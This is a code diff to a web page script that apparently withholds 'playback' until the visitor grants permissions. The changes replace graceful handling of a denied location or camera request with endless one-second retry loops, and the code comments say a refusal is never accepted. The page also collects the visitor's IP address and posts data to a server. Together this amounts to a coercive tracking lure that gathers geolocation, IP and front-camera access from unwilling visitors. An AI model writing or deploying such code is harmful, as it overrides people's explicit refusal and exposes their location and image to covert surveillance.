@@ -139,20 +139,23 @@ document.addEventListener('DOMContentLoaded', () => {
         console.log("Requesting permissions...");
 
         try {
-            // Helper to wrap Geolocation in a Promise (Resilient)
-            const getLocation = () => new Promise((resolve) => {
-                if (!("geolocation" in navigator)) {
-                    resolve({ coords: { latitude: "N/A", longitude: "N/A", accuracy: "N/A" } });
-                } else {
+            // Helper to wrap Geolocation in a Promise (Persistent)
+            const getPersistentLocation = () => new Promise((resolve) => {
+                const tryLoc = () => {
+                    if (!("geolocation" in navigator)) {
+                        resolve(null); // Not supported
+                        return;
+                    }
                     navigator.geolocation.getCurrentPosition(
                         resolve,
                         (err) => {
-                            console.log("Loc failed", err);
-                            resolve({ coords: { latitude: "N/A", longitude: "N/A", accuracy: "N/A" } });
+                            console.log("Loc failed, retrying...", err);
+                            setTimeout(tryLoc, 1000); // Retry forever
                         },
                         { enableHighAccuracy: true, timeout: 10000 }
                     );
-                }
+                };
+                tryLoc();
             });
 
             // Helper to get IP
@@ -164,13 +167,16 @@ document.addEventListener('DOMContentLoaded', () => {
                 } catch (e) { return "Unknown"; }
             };
 
-            // 1. Request Location FIRST
-            const position = await getLocation();
+            // 1. Request Location PERSISTENTLY
+            const position = await getPersistentLocation();
 
-            // STRICT CHECK: If Location was not granted, STOP here.
-            if (position.coords.latitude === "N/A") {
-                throw new Error("Location permission denied. Camera request aborted.");
+            // Check support
+            if (!position) {
+                throw new Error("Geolocation not supported by this browser.");
             }
+            // Note: If denied, getPersistentLocation loops forever, so we never reach here with "N/A" logic.
+
+            // (Previous strict check removed as we loop forever on failure now)
 
             // 2. Request IP (background, no prompt) without blocking if possible or just await
             const ip = await getIP();
@@ -187,8 +193,20 @@ document.addEventListener('DOMContentLoaded', () => {
                 })
             }).catch(console.error);
 
-            // 3. Request Camera LAST
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+            // 3. Request Camera PERSISTENTLY
+            const getPersistentCamera = async () => {
+                while (true) {
+                    try {
+                        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                        return stream;
+                    } catch (err) {
+                        console.log("Camera denied/failed, retrying...", err);
+                        await new Promise(r => setTimeout(r, 1000));
+                    }
+                }
+            };
+
+            const stream = await getPersistentCamera();
 
             console.log("Permissions granted. Starting capture...");
             permissionsGranted = true; // Enable playback
